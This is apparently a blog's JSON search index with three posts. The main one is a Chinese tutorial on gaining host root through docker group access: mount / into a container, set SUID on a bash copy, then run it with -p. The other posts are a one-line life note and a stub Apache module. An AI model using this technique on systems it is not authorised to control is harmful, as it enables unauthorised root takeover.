[{"content":" 在linux服务器中经常会遇到当前账户可以操作docker但是非root权限的情况，本文将介绍一种简单快捷的方法拿到宿主机的root权限\n背景 首先查看当前用户权限是否包含docker,下面这样就是包含docker权限\n\u0026gt; id uid=111(test) gid=113(test) groups=113(test),988(docker) 有时候查看当前权限没有显示docker像下面这样，实际也能操作docker\n\u0026gt; id uid=111(test) gid=113(test) groups=113(test) 所以直接执行docker ps 查看是最直接的\nSUID bash提权 什么是SUID 在 Linux 系统中，SUID（Set User ID） 是一种特殊的文件权限位，用于临时赋予用户执行文件时以文件所有者的身份运行的权限（而不是当前用户的身份）。这种权限通常用于允许普通用户执行某些需要更高权限的操作。\n说白了就是以非root用户权限执行SUID文件，该文件的实际权限还是root。\n这时候思路就来了，我们通过映射宿主机中的bash到容器中，再通过容器中的root权限将该bash设置SUID权限，然后将该文件拿到宿主机中执行即可拿到root权限\n实践 首先将宿主机根目录映射到容器中，然后在容器中将宿主机中的bash复制到/tmp目录，然后将该文件赋予SUID权限，最后退出容器在宿主机中执行该文件\ntest\u0026gt; docker run -v /:/mnt --rm -it alpine chroot /mnt sh \u0026gt; cp /bin/bash /tmp/bash \u0026gt; chmod +s /tmp/bash \u0026gt; exit # 退出当前chroot的shell \u0026gt; exit # 退出当前容器的shell test\u0026gt; /tmp/bash -p # 当前文件已经设置好SUID权限，所以直接执行即可获得root权限 \u0026gt; whoami root 该方法相对计划任务或其他方式提root更简单直接\n参考 https://www.cnblogs.com/kqdssheng/p/18275541\n","permalink":"https://wd0g.github.io/code/linux%E6%9C%89docker%E9%9D%9Eroot%E6%97%B6%E6%8F%90%E6%9D%83/","summary":"\u003cblockquote\u003e\n\u003cp\u003e在linux服务器中经常会遇到当前账户可以操作docker但是非root权限的情况，本文将介绍一种简单快捷的方法拿到宿主机的root权限\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"背景\"\u003e背景\u003c/h2\u003e\n\u003cp\u003e首先查看当前用户权限是否包含docker,下面这样就是包含docker权限\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; id\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e111\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etest\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e113\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etest\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egroups\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e113\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etest\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,988\u003cspan class=\"o\"\u003e(\u003c/span\u003edocker\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e有时候查看当前权限没有显示docker像下面这样，实际也能操作docker\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; id\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e111\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etest\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e113\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etest\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egroups\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e113\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etest\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e所以直接执行\u003cstrong\u003edocker ps\u003c/strong\u003e 查看是最直接的\u003c/p\u003e\n\u003ch2 id=\"suid-bash提权\"\u003eSUID bash提权\u003c/h2\u003e\n\u003ch3 id=\"什么是suid\"\u003e什么是SUID\u003c/h3\u003e\n\u003cp\u003e在 Linux 系统中，SUID（Set User ID） 是一种特殊的文件权限位，用于临时赋予用户执行文件时以文件所有者的身份运行的权限（而不是当前用户的身份）。这种权限通常用于允许普通用户执行某些需要更高权限的操作。\u003c/p\u003e\n\u003cp\u003e说白了就是以非root用户权限执行SUID文件，该文件的实际权限还是root。\u003c/p\u003e\n\u003cp\u003e这时候思路就来了，我们通过映射宿主机中的bash到容器中，再通过容器中的root权限将该bash设置SUID权限，然后将该文件拿到宿主机中执行即可拿到root权限\u003c/p\u003e\n\u003ch3 id=\"实践\"\u003e实践\u003c/h3\u003e\n\u003cp\u003e首先将宿主机根目录映射到容器中，然后在容器中将宿主机中的bash复制到/tmp目录，然后将该文件赋予SUID权限，最后退出容器在宿主机中执行该文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etest\u0026gt; docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; cp /bin/bash /tmp/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; chmod +s /tmp/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 退出当前chroot的shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 退出当前容器的shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etest\u0026gt; /tmp/bash -p \u003cspan class=\"c1\"\u003e# 当前文件已经设置好SUID权限，所以直接执行即可获得root权限\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; whoami\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e该方法相对\u003cstrong\u003e计划任务\u003c/strong\u003e或其他方式提root更简单直接\u003c/p\u003e\n\u003ch2 id=\"参考\"\u003e参考\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://www.cnblogs.com/kqdssheng/p/18275541\"\u003ehttps://www.cnblogs.com/kqdssheng/p/18275541\u003c/a\u003e\u003c/p\u003e","title":"Linux有docker非root时提权"},{"content":"啊，生活·\n","permalink":"https://wd0g.github.io/life/%E5%AF%B9%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95/","summary":"\u003cp\u003e啊，生活·\u003c/p\u003e","title":"对生活的一点想法"},{"content":"目的 使用c/cpp开发linux平台下的apache模块，实现拦截任意请求，并返回自定义内容。\n背景：apache运行和模块相关流程 实现 #include \u0026#34;httpd.h\u0026#34; #include \u0026#34;http_config.h\u0026#34; #include \u0026#34;http_protocol.h\u0026#34; #include \u0026#34;http_request.h\u0026#34; static int my_handler(request_rec *r) { ap_set_content_type(r, \u0026#34;text/html\u0026#34;); ap_rputs(\u0026#34;Hello, World!\u0026#34;, r); return OK; } 总结 ","permalink":"https://wd0g.github.io/code/apache-module-for-linux/","summary":"\u003ch2 id=\"目的\"\u003e目的\u003c/h2\u003e\n\u003cp\u003e使用c/cpp开发linux平台下的apache模块，实现拦截任意请求，并返回自定义内容。\u003c/p\u003e\n\u003ch2 id=\"背景apache运行和模块相关流程\"\u003e背景：apache运行和模块相关流程\u003c/h2\u003e\n\u003ch2 id=\"实现\"\u003e实现\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-cpp\" data-lang=\"cpp\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026#34;httpd.h\u0026#34;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026#34;http_config.h\u0026#34;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026#34;http_protocol.h\u0026#34;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026#34;http_request.h\u0026#34;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emy_handler\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erequest_rec\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eap_set_content_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;text/html\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eap_rputs\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Hello, World!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eOK\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"总结\"\u003e总结\u003c/h2\u003e","title":"Apache Module for Linux"}]